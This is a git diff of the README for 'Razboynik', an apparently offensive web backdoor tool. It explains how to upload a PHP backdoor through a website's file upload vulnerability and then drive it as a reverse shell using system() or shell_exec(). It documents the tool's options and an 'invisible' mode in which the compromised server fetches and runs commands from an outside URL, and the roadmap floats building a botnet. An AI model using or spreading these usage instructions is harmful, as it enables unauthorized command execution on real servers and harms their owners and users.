@@ -25,6 +25,8 @@ Razboynik is giving you a better interface to handle the server (nothing better 
 - Proxied tunnel (on the way)
 
 ##Binary
+(Not available yet)
+
 Binaries for differents platforms (Linux, Windows and soon or later Mac) will be available in the `./bin` directory. So if you don't want to build the application by yourself you can use it.
 
 On Windows launch: `./bin/razboynik.exe`
@@ -53,7 +55,7 @@ Instructions to build the app:
 (Makefile on the way)
 
 ##Demo
-(Video coming soon)
+[![asciicast](https://asciinema.org/a/92281.png)](https://asciinema.org/a/92281)
 
 Let's suppose you find a file upload vulnerability in a website and you upload the script available in `res/backdoor` folder.
 Now the url of your script could be (as example) : http://{website}/uploads/script.php
@@ -67,28 +69,65 @@ If you want to change the parameter sent, add -p flag and precise it. Like : `./
 By default the parameter is "razboynik". Parameter is the name of the field or header or cookie (depends on method) sent to server. If the method is GET, razboynik will simply add at the end of the url = ?razboynik={request}.
 
 If you want to change the method, add -m flag as : `./razboynik r -u ... -m POST`.
-By default, method is set to GET. You have the choice between : GET, POST, HEADER (evil request will be set in headers), COOKIE (not available for now).
+By default, method is set to GET. You have the choice between : GET, POST, HEADER (evil request will be set in headers), COOKIE.
 
-For more option you can add -h flag. Or type `./razboynik help run`.
-If you want a step by step configuration just run `./razboynik`.
+For more option you can add -h flag. Or type `./razboynik help`.
 
 ##API
 You will find the API of all the business logic in the appropriate repository `razboy`
 
+###run
+Run a reverse shell with specified configuration
+
+OPTIONS: 
+    - `-u, --url`: (string) Url of the target. Ex: -u http://localhost/script.php
+    - `-m, --method`: (string) Method to use. Ex: -m POST (default: "GET")
+    - `-p, --parameter`: (string) Parameter to use. Ex: -p test (default: "razboynik")
+    - `-s, --shellmethod`: (int) Shellmethod to use. Ex: -s 0 (default: 0) [0 => system(), 1 => shell_exec()]
+    - `-k, --key`: (string) Key to unlock optional small protecion. Ex: -k keytounlock (default: "FromRussiaWithLove<3")
+    - `-r, --raw`: (bool) If set, send the request without base64 encoding
+    - `-c, --crypt`: (Not available)
+
+###generate
+(Not available yet)
+
+###scan
+Scan a website to identify what shell method and method works on it.
+
+OPTIONS:
+    - `-u, --url`: (string) Url of the target. Ex: -u http://localhost/script.php
+    - `-p, --parameter`: (string) Parameter to use. Ex: -p test (default: "razboynik")
+    - `-k, --key`: (string) Key to unlock optional small protecion. Ex: -k keytounlock (default: "FromRussiaWithLove<3")
+
+###invisible
+Execute a raw command available at an url (referer). Ex: http://website/cmd.txt point to 'echo 1;' in body, then I can do : -u ... -r http://website/cmd.txt
+
+OPTIONS:
+    - `-u, --url`: (string) Url of the target. Ex: -u http://localhost/script.php
+    - `-r, --referer`: (string) Url that the server will call to get the cmd to execute. Ex: -r http://website.com/cmd-i-want-to-execute.txt
+
+###encode / decode
+Encode or decode string.
+
+Ex: encode hello => aGVsbG8=
+    decode aGVsbG8= => hello
+
 ##Roadmap
 ###1.5.0
-- Better base64 gesture (Think of getting raw request for debugging)
+- Raw request
 - Better error in razboy (core)
 - Add more information when run fail
 - Add cookie method
-- Add asciinema video
-- Add `./bin` folder with binaries
+- Implement optional key protection
+- Add base64 encoding and decoding to root
+- Add invisible method
 
 ###1.6.0
 - Add web server (FurezApi legacy)
-- Implement key ?
+- Add `./bin` folder with binaries
 - More documentation
+- Add asciinema video (in progress)
 - Create a botnet ? Handle multiple server at the same time
-- Config file ?
+- Config file
 - Proxied tunnel
 - Crypto
